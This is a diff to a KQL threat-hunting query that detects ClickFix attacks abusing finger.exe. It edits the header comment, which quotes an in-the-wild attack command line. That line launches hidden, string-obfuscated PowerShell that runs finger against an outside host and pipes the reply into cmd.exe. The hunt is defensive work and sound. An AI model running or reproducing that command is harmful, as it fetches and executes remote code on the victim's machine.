@@ -1,10 +1,7 @@
 // Hunt: ClickFix finger protocol abuse
 // Table: DeviceCustomScriptEvents
-// Source: pattern confirmed against a real detection in this tenant's
-//         AlertEvidence table (AlertId
-//         dab879c26d-f140-42c9-83bd-8a2cc293857e_1, "Suspicious
-//         'SuspClickFix' behavior was blocked"), whose command line was
-//         "cmd.exe" /c start "" /min powershell -c "& powershell
+// Source: pattern confirmed against a real in-the-wild ClickFix command
+//         line: "cmd.exe" /c start "" /min powershell -c "& powershell
 //         ('-Windo' + 'wStyle') ('hid' + 'den') -c finger
 //         mag@finger.captchamag.com | C:\WINDOWS\system32\cmd.exe".
 // Purpose: finger.exe is a living off the land binary that performs a
@@ -16,9 +13,9 @@
 //          execution. None of the other hunts in this set look for finger
 //          specifically, this closes that gap.
 // Validated: success. Regex confirmed via print against the literal
-//          command text from the real detection above, correctly isolating
-//          "finger mag@finger.captchamag.com". Returned 0 rows against live
-//          SOC-Central data in the 7 day window, a clean result.
+//          command text above, correctly isolating
+//          "finger mag@finger.captchamag.com". Returns 0 rows when no
+//          finger-based retrieval pattern is present, a clean result.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
